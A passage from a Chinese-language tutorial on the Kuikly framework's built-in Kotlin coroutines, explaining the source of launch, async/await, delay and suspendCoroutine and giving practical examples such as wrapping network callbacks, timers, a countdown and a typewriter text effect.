<table><thead><tr><th>特性</th><th>Kuikly 内建协程</th><th>kotlinx.coroutines</th></tr></thead><tbody><tr><td>包大小</td><td>无额外依赖</td><td>增加约 1MB</td></tr><tr><td>动态化支持</td><td>✅ 支持</td><td>❌ 不支持</td></tr><tr><td>线程安全</td><td>单线程，自动保障</td><td>需要开发者考虑</td></tr><tr><td>功能丰富度</td><td>基础功能</td><td>完整功能</td></tr></tbody></table>
<p><strong>Kuikly 协程的设计理念：</strong></p>
<blockquote>
<p>所有协程都在 Kuikly 线程中执行，没有线程切换，没有线程安全问题。</p>
</blockquote>
<h3 data-id="heading-12">launch 函数源码解析</h3>
<p>让我们逐行解析 <code>launch</code> 函数：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 来自 Builders.kt</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> CoroutineScope.<span class="hljs-title">launch</span><span class="hljs-params">(
    context: <span class="hljs-type">CoroutineContext</span> = EmptyCoroutineContext,
    start: <span class="hljs-type">CoroutineStart</span> = CoroutineStart.ATOMIC,
    block: <span class="hljs-type">suspend</span> <span class="hljs-type">CoroutineScope</span>.() -&gt; <span class="hljs-type">Unit</span>
)</span></span>: Job {
    <span class="hljs-comment">// 1. 创建一个独立协程对象</span>
    <span class="hljs-keyword">val</span> job = StandaloneCoroutine(context)
    
    <span class="hljs-comment">// 2. 启动协程</span>
    job.start(start, <span class="hljs-keyword">this</span>) {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 3. 执行你传入的协程代码</span>
            block.invoke(<span class="hljs-keyword">this</span>)
        } <span class="hljs-keyword">catch</span> (e: Throwable) {
            <span class="hljs-comment">// 4. 协程内的异常需要特殊处理</span>
            throwCoroutineScopeException(e)
        }
    }
    
    <span class="hljs-comment">// 5. 返回 Job 供外部控制</span>
    <span class="hljs-keyword">return</span> job
}
</code></pre>
<p><strong>参数详解：</strong></p>
<ol>
<li>
<p><strong><code>context: CoroutineContext</code></strong></p>
<ul>
<li>协程上下文，可以携带额外信息</li>
<li>默认是 <code>EmptyCoroutineContext</code>（空上下文）</li>
</ul>
</li>
<li>
<p><strong><code>start: CoroutineStart</code></strong></p>
<ul>
<li>启动模式，Kuikly 只支持 <code>ATOMIC</code>（立即执行）</li>
<li>标准库还有 <code>LAZY</code>（延迟启动）等模式</li>
</ul>
</li>
<li>
<p><strong><code>block: suspend CoroutineScope.() -&gt; Unit</code></strong></p>
<ul>
<li>这是你要执行的协程代码</li>
<li><code>suspend</code>：表示这是挂起函数</li>
<li><code>CoroutineScope.()</code>：表示 Lambda 内部可以访问 <code>CoroutineScope</code> 的成员</li>
</ul>
</li>
</ol>
<p><strong>CoroutineStart 的 invoke 操作符：</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 来自 CoroutineStart.kt</span>
<span class="hljs-keyword">enum</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CoroutineStart</span> {
    ATOMIC;

    <span class="hljs-keyword">operator</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;R, T&gt;</span> <span class="hljs-title">invoke</span><span class="hljs-params">(
        block: <span class="hljs-type">suspend</span> <span class="hljs-type">R</span>.() -&gt; <span class="hljs-type">T</span>,
        receiver: <span class="hljs-type">R</span>,
        completion: <span class="hljs-type">Continuation</span>&lt;<span class="hljs-type">T</span>&gt;
    )</span></span>: <span class="hljs-built_in">Unit</span> =
        <span class="hljs-keyword">when</span> (<span class="hljs-keyword">this</span>) {
            ATOMIC -&gt; block.startCoroutine(receiver, completion)
        }
}
</code></pre>
<p><code>block.startCoroutine(receiver, completion)</code> 是 Kotlin 标准库提供的函数，它：</p>
<ol>
<li>创建协程的状态机</li>
<li>以 <code>receiver</code> 作为接收者执行 <code>block</code></li>
<li>执行完成后调用 <code>completion.resumeWith(result)</code></li>
</ol>
<h3 data-id="heading-13">async/await 机制解析</h3>
<p><code>async</code> 比 <code>launch</code> 多了返回值的处理：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T&gt;</span> CoroutineScope.<span class="hljs-title">async</span><span class="hljs-params">(
    context: <span class="hljs-type">CoroutineContext</span> = EmptyCoroutineContext,
    start: <span class="hljs-type">CoroutineStart</span> = CoroutineStart.ATOMIC,
    block: <span class="hljs-type">suspend</span> <span class="hljs-type">CoroutineScope</span>.() -&gt; <span class="hljs-type">T</span>
)</span></span>: Deferred&lt;T&gt; {
    <span class="hljs-comment">// 使用 DeferredCoroutine 而不是 StandaloneCoroutine</span>
    <span class="hljs-keyword">val</span> job = DeferredCoroutine&lt;T&gt;(context)
    job.start(start, <span class="hljs-keyword">this</span>) {
        <span class="hljs-keyword">try</span> {
            block.invoke(<span class="hljs-keyword">this</span>)  <span class="hljs-comment">// 返回值会被 DeferredCoroutine 捕获</span>
        } <span class="hljs-keyword">catch</span> (e: Throwable) {
            throwCoroutineScopeException(e)
            <span class="hljs-keyword">val</span> res: T? = <span class="hljs-literal">null</span>
            res!!  <span class="hljs-comment">// 这行只是为了满足编译器，异常已经抛出了</span>
        }
    }
    <span class="hljs-keyword">return</span> job
}
</code></pre>
<p><strong>DeferredCoroutine 的实现（重点！）：</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">internal</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DeferredCoroutine</span>&lt;<span class="hljs-type">T</span>&gt;(
    parentContext: CoroutineContext
) : AbstractCoroutine&lt;T&gt;(parentContext), Deferred&lt;T&gt; {
    
    <span class="hljs-comment">// 存储等待结果的回调列表</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> suspendCoroutineResumeTasks = fastArrayListOf&lt;(T) -&gt; <span class="hljs-built_in">Unit</span>&gt;()
    
    <span class="hljs-comment">// 标记是否已经有结果</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> didSetResultValue = <span class="hljs-literal">false</span>
    
    <span class="hljs-comment">// 存储结果值</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> resumeResultValue: T? = <span class="hljs-literal">null</span>
        <span class="hljs-keyword">set</span>(value) {
            field = value
            didSetResultValue = <span class="hljs-literal">true</span>
        }

    <span class="hljs-comment">// await 的入口</span>
    <span class="hljs-keyword">override</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">await</span><span class="hljs-params">()</span></span>: T = awaitInternal()

    <span class="hljs-comment">// 当协程完成时被调用（来自 Continuation 接口）</span>
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">resumeWith</span><span class="hljs-params">(result: <span class="hljs-type">Result</span>&lt;<span class="hljs-type">T</span>&gt;)</span></span> {
        <span class="hljs-keyword">if</span> (result.isSuccess) {
            <span class="hljs-comment">// 保存结果</span>
            resumeResultValue = result.getOrNull()
            <span class="hljs-comment">// 通知所有等待者</span>
            suspendCoroutineResumeTasks.forEach { callback -&gt;
                callback.invoke(resumeResultValue <span class="hljs-keyword">as</span> T)
            }
            suspendCoroutineResumeTasks.clear()
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">throw</span> RuntimeException(<span class="hljs-string">"result failure:"</span> + result.exceptionOrNull())
        }
    }

    <span class="hljs-comment">// 内部实现：快速路径和慢速路径</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">awaitInternal</span><span class="hljs-params">()</span></span>: T {
        <span class="hljs-keyword">if</span> (didSetResultValue) {
            <span class="hljs-comment">// 快速路径：结果已经有了，直接返回</span>
            <span class="hljs-keyword">return</span> resumeResultValue <span class="hljs-keyword">as</span> T
        }
        <span class="hljs-comment">// 慢速路径：需要挂起等待</span>
        <span class="hljs-keyword">return</span> awaitSuspend()
    }

    <span class="hljs-comment">// 慢速路径：挂起当前协程，等待结果</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">awaitSuspend</span><span class="hljs-params">()</span></span>: T = suspendCoroutine { continuation -&gt;
        <span class="hljs-comment">// 把恢复协程的回调加入等待列表</span>
        <span class="hljs-keyword">this</span>.suspendCoroutineResumeTasks.add { value -&gt;
            continuation.resume(value)
        }
    }
}
</code></pre>
<p><strong>工作流程图解：</strong></p>
<pre><code class="hljs language-scss" lang="scss">                    async { ... }
                         │
                         ▼
              ┌─────────────────────┐
              │  DeferredCoroutine  │
              │  创建并开始执行      │
              └─────────────────────┘
                         │
         ┌───────────────┴───────────────┐
         │                               │
         ▼                               ▼
   协程还在执行...                  协程执行完成
         │                               │
         │                               ▼
         │                    <span class="hljs-built_in">resumeWith</span>(result)
         │                               │
         │                               ▼
         │                    didSetResultValue = true
         │                    resumeResultValue = 结果值
         │                               │
         ▼                               │
    <span class="hljs-built_in">await</span>() 被调用                        │
         │                               │
         ▼                               │
   didSetResultValue?                    │
         │                               │
    ┌────┴────┐                          │
    │         │                          │
   true     false                        │
    │         │                          │
    ▼         ▼                          │
  直接返回   <span class="hljs-built_in">awaitSuspend</span>()               │
  结果值         │                        │
                ▼                        │
          挂起，加入等待列表 ◄─────────────┘
                │                   当结果可用时
                ▼                   通知所有等待者
          恢复，返回结果值
</code></pre>
<h3 data-id="heading-14">delay 的实现原理</h3>
<p><code>delay</code> 函数让协程暂停指定时间：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> CoroutineScope.<span class="hljs-title">delay</span><span class="hljs-params">(timeMs: <span class="hljs-type">Int</span>)</span></span> {
    <span class="hljs-comment">// 1. 确定 pagerId（用于定时器管理）</span>
    <span class="hljs-keyword">val</span> pagerId = <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span> <span class="hljs-keyword">is</span> LifecycleScope) {
        pagerScope.pagerId
    } <span class="hljs-keyword">else</span> {
        BridgeManager.currentPageId.ifEmpty { <span class="hljs-keyword">return</span> }
    }
    
    <span class="hljs-comment">// 2. 使用 suspendCoroutine 挂起协程</span>
    suspendCoroutine&lt;<span class="hljs-built_in">Unit</span>&gt; { continuation -&gt;
        <span class="hljs-comment">// 3. 设置定时器</span>
        setTimeout(pagerId, timeMs) {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-comment">// 4. 定时器到期后恢复协程</span>
                continuation.resume(<span class="hljs-built_in">Unit</span>)
            } <span class="hljs-keyword">catch</span> (e: Throwable) {
                throwCoroutineScopeException(e)
            }
        }
    }
}
</code></pre>
<p><strong>核心要点：</strong></p>
<ol>
<li><code>suspendCoroutine</code> 挂起当前协程，拿到 <code>continuation</code></li>
<li><code>setTimeout</code> 设置原生定时器</li>
<li>定时器回调中调用 <code>continuation.resume(Unit)</code> 恢复协程</li>
</ol>
<hr/>
<h2 data-id="heading-15">第四部分：suspendCoroutine 深度解析</h2>
<h3 data-id="heading-16">回调地狱问题</h3>
<p>假设我们有一个回调式的网络请求 API：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">requestGet</span><span class="hljs-params">(
    url: <span class="hljs-type">String</span>, 
    params: <span class="hljs-type">JSONObject</span>, 
    callback: (<span class="hljs-type">data</span>: <span class="hljs-type">JSONObject</span>, <span class="hljs-type">success</span>: <span class="hljs-type">Boolean</span>, <span class="hljs-type">error</span>: <span class="hljs-type">String</span>?) -&gt; <span class="hljs-type">Unit</span>
)</span></span> {
    <span class="hljs-comment">// 原生实现...</span>
}
</code></pre>
<p>如果需要顺序执行多个请求：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 回调地狱 😱</span>
requestGet(url1, params1) { data1, success1, error1 -&gt;
    <span class="hljs-keyword">if</span> (success1) {
        requestGet(url2, JSONObject().put(<span class="hljs-string">"id"</span>, data1.getString(<span class="hljs-string">"id"</span>))) { data2, success2, error2 -&gt;
            <span class="hljs-keyword">if</span> (success2) {
                requestGet(url3, JSONObject().put(<span class="hljs-string">"token"</span>, data2.getString(<span class="hljs-string">"token"</span>))) { data3, success3, error3 -&gt;
                    <span class="hljs-keyword">if</span> (success3) {
                        <span class="hljs-comment">// 终于拿到最终数据了...</span>
                        updateUI(data3)
                    } <span class="hljs-keyword">else</span> {
                        showError(error3)
                    }
                }
            } <span class="hljs-keyword">else</span> {
                showError(error2)
            }
        }
    } <span class="hljs-keyword">else</span> {
        showError(error1)
    }
}
</code></pre>
<h3 data-id="heading-17">suspendCoroutine 的工作原理</h3>
<p><code>suspendCoroutine</code> 是桥接回调式 API 和协程的关键函数：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// Kotlin 标准库中的定义</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">suspend</span> <span class="hljs-keyword">inline</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T&gt;</span> <span class="hljs-title">suspendCoroutine</span><span class="hljs-params">(
    <span class="hljs-keyword">crossinline</span> block: (<span class="hljs-type">Continuation</span>&lt;<span class="hljs-type">T</span>&gt;) -&gt; <span class="hljs-type">Unit</span>
)</span></span>: T
</code></pre>
<p><strong>它做了什么？</strong></p>
<ol>
<li>挂起当前协程</li>
<li>把 <code>Continuation</code> 对象传给你的 <code>block</code></li>
<li>你在 <code>block</code> 中决定何时调用 <code>continuation.resume(value)</code> 恢复协程</li>
</ol>
<p><strong>图解：</strong></p>
<pre><code class="hljs language-scss" lang="scss">┌─────────────────────────────────────────────────────────────┐
│                                                             │
│   协程执行中...                                               │
│        │                                                    │
│        ▼                                                    │
│   遇到 suspendCoroutine { continuation -&gt; ... }              │
│        │                                                    │
│        ▼                                                    │
│   ┌────────────────────────────────────┐                   │
│   │  协程挂起！                         │                   │
│   │  把 Continuation 交给你的 block     │                   │
│   └────────────────────────────────────┘                   │
│        │                                                    │
│        ▼                                                    │
│   你在 block 中做异步操作...                                  │
│   （比如发起网络请求）                                         │
│        │                                                    │
│        ▼                                                    │
│   异步操作完成，调用 continuation<span class="hljs-selector-class">.resume</span>(result)              │
│        │                                                    │
│        ▼                                                    │
│   ┌────────────────────────────────────┐                   │
│   │  协程恢复！                         │                   │
│   │  suspendCoroutine 返回 result       │                   │
│   └────────────────────────────────────┘                   │
│        │                                                    │
│        ▼                                                    │
│   协程继续执行...                                             │
│                                                             │
└─────────────────────────────────────────────────────────────┘
</code></pre>
<h3 data-id="heading-18">实战：封装网络请求</h3>
<p><strong>将回调式 API 转换为挂起函数的标准模式：</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 原始的回调式 API</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">requestGet</span><span class="hljs-params">(
    url: <span class="hljs-type">String</span>,
    params: <span class="hljs-type">JSONObject</span>,
    callback: (<span class="hljs-type">data</span>: <span class="hljs-type">JSONObject</span>, <span class="hljs-type">success</span>: <span class="hljs-type">Boolean</span>, <span class="hljs-type">errorMsg</span>: <span class="hljs-type">String</span>?, <span class="hljs-type">code</span>: <span class="hljs-type">Int</span>) -&gt; <span class="hljs-type">Unit</span>
)</span></span>

<span class="hljs-comment">// 封装为挂起函数</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">requestGet</span><span class="hljs-params">(url: <span class="hljs-type">String</span>, params: <span class="hljs-type">JSONObject</span>)</span></span>: JSONObject =
    suspendCoroutine { continuation -&gt;
        <span class="hljs-comment">// 调用原始 API</span>
        acquireModule&lt;NetworkModule&gt;(NetworkModule.MODULE_NAME).requestGet(
            url,
            params
        ) { <span class="hljs-keyword">data</span>, success, errorMsg, _ -&gt;
            <span class="hljs-keyword">if</span> (success) {
                <span class="hljs-comment">// 成功：恢复协程并返回数据</span>
                continuation.resume(<span class="hljs-keyword">data</span>)
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-comment">// 失败：恢复协程并抛出异常</span>
                continuation.resumeWithException(
                    IllegalStateException(<span class="hljs-string">"请求失败: <span class="hljs-variable">$errorMsg</span>"</span>)
                )
            }
        }
    }
</code></pre>
<p><strong>使用封装后的挂起函数：</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 现在可以像同步代码一样使用了！</span>
lifecycleScope.launch {
    <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">val</span> user = requestGet(<span class="hljs-string">"https://api.example.com/user"</span>, JSONObject())
        <span class="hljs-keyword">val</span> orders = requestGet(
            <span class="hljs-string">"https://api.example.com/orders"</span>,
            JSONObject().put(<span class="hljs-string">"userId"</span>, user.getString(<span class="hljs-string">"id"</span>))
        )
        <span class="hljs-keyword">val</span> detail = requestGet(
            <span class="hljs-string">"https://api.example.com/order/detail"</span>,
            JSONObject().put(<span class="hljs-string">"orderId"</span>, orders.getJSONArray(<span class="hljs-string">"list"</span>).getJSONObject(<span class="hljs-number">0</span>).getString(<span class="hljs-string">"id"</span>))
        )
        
        <span class="hljs-comment">// 更新 UI</span>
        orderDetail = detail
    } <span class="hljs-keyword">catch</span> (e: Exception) {
        errorMessage = e.message ?: <span class="hljs-string">"未知错误"</span>
    }
}
</code></pre>
<p><strong>通用封装模板：</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">/**
 * 将任何回调式 API 转换为挂起函数的通用模板
 * <span class="hljs-doctag">@param</span> T 成功时的返回类型
 */</span>
<span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T&gt;</span> <span class="hljs-title">suspendCallback</span><span class="hljs-params">(
    block: (<span class="hljs-type">onSuccess</span>: (<span class="hljs-type">T</span>) -&gt; <span class="hljs-type">Unit</span>, <span class="hljs-type">onError</span>: (<span class="hljs-type">Exception</span>) -&gt; <span class="hljs-type">Unit</span>) -&gt; <span class="hljs-type">Unit</span>
)</span></span>: T = suspendCoroutine { continuation -&gt;
    block(
        <span class="hljs-comment">// 成功回调</span>
        { result -&gt; continuation.resume(result) },
        <span class="hljs-comment">// 失败回调</span>
        { error -&gt; continuation.resumeWithException(error) }
    )
}

<span class="hljs-comment">// 使用模板</span>
<span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">fetchUserInfo</span><span class="hljs-params">()</span></span>: User = suspendCallback { onSuccess, onError -&gt;
    userApi.getInfo(
        onSuccess = { onSuccess(it) },
        onError = { onError(it) }
    )
}
</code></pre>
<hr/>
<h2 data-id="heading-19">第五部分：Kuikly 中的协程实战</h2>
<h3 data-id="heading-20">GlobalScope vs LifecycleScope</h3>
<p>Kuikly 提供了两种协程作用域：</p>
<p><strong>1. GlobalScope（全局作用域）</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">object</span> GlobalScope : CoroutineScope {
    <span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> coroutineContext: CoroutineContext
        <span class="hljs-keyword">get</span>() = EmptyCoroutineContext
}
</code></pre>
<p>特点：</p>
<ul>
<li>不与任何生命周期绑定</li>
<li>协程会一直运行直到完成或手动取消</li>
<li>⚠️ 使用不当可能导致内存泄漏</li>
</ul>
<p><strong>2. LifecycleScope（生命周期作用域）</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">LifecycleScope</span>(<span class="hljs-keyword">internal</span> <span class="hljs-keyword">val</span> pagerScope: PagerScope) : CoroutineScope {
    <span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> coroutineContext: CoroutineContext
        <span class="hljs-keyword">get</span>() = EmptyCoroutineContext
}

<span class="hljs-comment">// 在 Pager 中使用</span>
<span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Pager</span> {
    <span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> lifecycleScope: LifecycleScope <span class="hljs-keyword">by</span> lazy(LazyThreadSafetyMode.NONE) {
        LifecycleScope(<span class="hljs-keyword">this</span>)
    }
}
</code></pre>
<p>特点：</p>
<ul>
<li>与页面生命周期绑定</li>
<li>页面销毁时自动清理资源</li>
<li>✅ 推荐在页面中使用</li>
</ul>
<p><strong>使用建议：</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// ❌ 不推荐：GlobalScope 可能导致泄漏</span>
GlobalScope.launch {
    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
        delay(<span class="hljs-number">1000</span>)
        updateUI()  <span class="hljs-comment">// 页面销毁后还在执行！</span>
    }
}

<span class="hljs-comment">// ✅ 推荐：lifecycleScope 自动管理</span>
lifecycleScope.launch {
    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
        delay(<span class="hljs-number">1000</span>)
        updateUI()  <span class="hljs-comment">// 页面销毁时自动停止</span>
    }
}
</code></pre>
<h3 data-id="heading-21">网络请求最佳实践</h3>
<p><strong>完整示例：</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Page(<span class="hljs-string">"UserProfilePage"</span>)</span>
<span class="hljs-keyword">internal</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserProfilePage</span> : <span class="hljs-type">BasePager</span>() {
    <span class="hljs-comment">// 响应式状态</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> isLoading <span class="hljs-keyword">by</span> observable(<span class="hljs-literal">false</span>)
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> userData <span class="hljs-keyword">by</span> observable&lt;UserData?&gt;(<span class="hljs-literal">null</span>)
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> errorMsg <span class="hljs-keyword">by</span> observable&lt;String?&gt;(<span class="hljs-literal">null</span>)

    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">body</span><span class="hljs-params">()</span></span>: ViewBuilder {
        <span class="hljs-keyword">val</span> ctx = <span class="hljs-keyword">this</span>
        <span class="hljs-keyword">return</span> {
            <span class="hljs-comment">// ... UI 代码</span>
            vif({ ctx.isLoading }) {
                LoadingView { }
            }
            vif({ ctx.userData != <span class="hljs-literal">null</span> }) {
                UserInfoCard {
                    attr { <span class="hljs-keyword">data</span> = ctx.userData }
                }
            }
            vif({ ctx.errorMsg != <span class="hljs-literal">null</span> }) {
                ErrorView {
                    attr { message = ctx.errorMsg }
                    event {
                        onRetry { ctx.fetchUserData() }
                    }
                }
            }
        }
    }

    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">created</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">super</span>.created()
        fetchUserData()
    }

    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">fetchUserData</span><span class="hljs-params">()</span></span> {
        lifecycleScope.launch {
            isLoading = <span class="hljs-literal">true</span>
            errorMsg = <span class="hljs-literal">null</span>
            
            <span class="hljs-keyword">try</span> {
                <span class="hljs-comment">// 并行请求用户基本信息和统计数据</span>
                <span class="hljs-keyword">val</span> userInfoDeferred = GlobalScope.async { fetchUserInfo() }
                <span class="hljs-keyword">val</span> statsDeferred = GlobalScope.async { fetchUserStats() }
                
                <span class="hljs-comment">// 等待两个请求都完成</span>
                <span class="hljs-keyword">val</span> userInfo = userInfoDeferred.await()
                <span class="hljs-keyword">val</span> stats = statsDeferred.await()
                
                <span class="hljs-comment">// 合并数据</span>
                userData = UserData(userInfo, stats)
            } <span class="hljs-keyword">catch</span> (e: Exception) {
                errorMsg = <span class="hljs-string">"加载失败: <span class="hljs-subst">${e.message}</span>"</span>
            } <span class="hljs-keyword">finally</span> {
                isLoading = <span class="hljs-literal">false</span>
            }
        }
    }

    <span class="hljs-comment">// 封装的挂起函数</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">fetchUserInfo</span><span class="hljs-params">()</span></span>: JSONObject = suspendCoroutine { cont -&gt;
        acquireModule&lt;NetworkModule&gt;(NetworkModule.MODULE_NAME)
            .requestGet(<span class="hljs-string">"https://api.example.com/user"</span>, JSONObject()) { <span class="hljs-keyword">data</span>, success, error, _ -&gt;
                <span class="hljs-keyword">if</span> (success) cont.resume(<span class="hljs-keyword">data</span>)
                <span class="hljs-keyword">else</span> cont.resumeWithException(Exception(error))
            }
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">fetchUserStats</span><span class="hljs-params">()</span></span>: JSONObject = suspendCoroutine { cont -&gt;
        acquireModule&lt;NetworkModule&gt;(NetworkModule.MODULE_NAME)
            .requestGet(<span class="hljs-string">"https://api.example.com/user/stats"</span>, JSONObject()) { <span class="hljs-keyword">data</span>, success, error, _ -&gt;
                <span class="hljs-keyword">if</span> (success) cont.resume(<span class="hljs-keyword">data</span>)
                <span class="hljs-keyword">else</span> cont.resumeWithException(Exception(error))
            }
    }
}
</code></pre>
<h3 data-id="heading-22">定时任务与动画</h3>
<p><strong>实现定时器：</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Timer</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> isRunning = <span class="hljs-literal">false</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">lateinit</span> <span class="hljs-keyword">var</span> action: () -&gt; <span class="hljs-built_in">Unit</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> delay: <span class="hljs-built_in">Int</span> = <span class="hljs-number">0</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> period: <span class="hljs-built_in">Int</span> = <span class="hljs-number">0</span>

    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">schedule</span><span class="hljs-params">(delay: <span class="hljs-type">Int</span>, period: <span class="hljs-type">Int</span>, action: () -&gt; <span class="hljs-type">Unit</span>)</span></span> {
        <span class="hljs-keyword">this</span>.delay = delay
        <span class="hljs-keyword">this</span>.period = period
        <span class="hljs-keyword">this</span>.action = action
        start()
    }

    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">cancel</span><span class="hljs-params">()</span></span> {
        isRunning = <span class="hljs-literal">false</span>
    }

    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">start</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">if</span> (isRunning) <span class="hljs-keyword">return</span>
        isRunning = <span class="hljs-literal">true</span>
        GlobalScope.launch {
            delay(delay)  <span class="hljs-comment">// 初始延迟</span>
            <span class="hljs-keyword">while</span> (isRunning) {
                action()
                delay(period)  <span class="hljs-comment">// 周期延迟</span>
            }
        }
    }
}

<span class="hljs-comment">// 使用示例</span>
<span class="hljs-keyword">val</span> timer = Timer()
timer.schedule(delay = <span class="hljs-number">0</span>, period = <span class="hljs-number">1000</span>) {
    count++  <span class="hljs-comment">// 每秒增加</span>
}

<span class="hljs-comment">// 停止定时器</span>
timer.cancel()
</code></pre>
<p><strong>实现倒计时：</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Page(<span class="hljs-string">"CountdownPage"</span>)</span>
<span class="hljs-keyword">internal</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CountdownPage</span> : <span class="hljs-type">BasePager</span>() {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> seconds <span class="hljs-keyword">by</span> observable(<span class="hljs-number">60</span>)

    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">created</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">super</span>.created()
        lifecycleScope.launch {
            <span class="hljs-keyword">while</span> (seconds &gt; <span class="hljs-number">0</span>) {
                delay(<span class="hljs-number">1000</span>)
                seconds--
            }
            <span class="hljs-comment">// 倒计时结束</span>
            onCountdownFinished()
        }
    }
}
</code></pre>
<p><strong>实现流式文字效果：</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Page(<span class="hljs-string">"TypewriterPage"</span>)</span>
<span class="hljs-keyword">internal</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TypewriterPage</span> : <span class="hljs-type">BasePager</span>() {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> displayText <span class="hljs-keyword">by</span> observable(<span class="hljs-string">""</span>)
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> fullText = <span class="hljs-string">"这是一段会逐字显示的文本..."</span>

    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">created</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">super</span>.created()
        lifecycleScope.launch {
            <span class="hljs-keyword">for</span> (i <span class="hljs-keyword">in</span> fullText.indices) {
                displayText = fullText.substring(<span class="hljs-number">0</span>, i + <span class="hljs-number">1</span>)
                delay(<span class="hljs-number">50</span>)  <span class="hljs-comment">// 每 50ms 显示一个字</span>
            }
        }
    }
}
</code></pre>
<h3 data-id="heading-23">多协程协作模式</h3>
<p><strong>模式 1：顺序执行</strong></p>
